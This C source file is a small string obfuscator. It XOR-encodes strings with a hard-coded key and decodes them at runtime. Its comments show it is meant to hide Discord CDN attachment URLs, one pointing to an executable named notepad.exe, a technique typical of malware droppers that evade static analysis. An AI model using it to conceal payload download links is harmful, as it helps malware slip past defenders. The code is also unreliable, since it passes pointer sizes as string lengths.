#include "stringObfuscator.h"

char* xorencrypt(char* message, char* key) {
	size_t messagelen = strlen(message);
	size_t keylen = strlen(key);
	char* encrypted = (char*)malloc(messagelen + 1);
	
	for (int i = 0; i < messagelen; i++) {
		encrypted[i] = message[i] ^ key[i % keylen];
	}
	encrypted[messagelen] = '\0';

	printf("\n char encrypted[] = { ");

	for (int i = 0; i < messagelen; i++) {
		printf("0x%02x,", encrypted[i]);
	}
	printf(" };\n");

	xordecrypt(encrypted, key, sizeof(encrypted), sizeof(key));
	return encrypted;
}

char* xordecrypt(char* encrypted, char* key, int size, int keysize) {
	char* decrypted = (char*)malloc(size + 1);

	for (int i = 0; i < size; i++) {
		decrypted[i] = encrypted[i] ^ key[i % keysize];
	}
	
	decrypted[size] = '\0';
	
	//printf("decrypted string = %s\n", decrypted);
	return decrypted;
}

char * stringDeobfuscator(char encrypted[], int size) {

	//const char * str1 = "https://cdn.discordapp.com/attachments/933802191230205966/933803146042544178/test.txt";
	//const char * str2 = "https://cdn.discordapp.com/attachments/933802191230205966/933803748562706533/notepad.exe";
	//xorencrypt((char*)str2, (char*)"This Is the Secret Key");
	//encrypted version of discord cdn link for test.txt
	return xordecrypt(encrypted, (char*)"This Is the Secret Key", size, strlen("This Is the Secret Key"));

	
}
